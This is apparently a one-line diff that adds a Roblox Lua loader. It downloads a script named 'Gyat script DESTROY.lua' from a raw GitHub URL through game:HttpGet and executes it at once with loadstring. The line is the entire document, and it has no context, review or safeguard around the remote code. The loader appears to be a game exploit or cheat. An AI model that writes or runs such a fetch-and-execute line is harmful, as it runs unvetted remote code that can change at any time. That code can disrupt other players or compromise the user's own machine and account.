@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Imalwibest/Imalwibest/main/Gyat%20script%20DESTROY.lua'))()
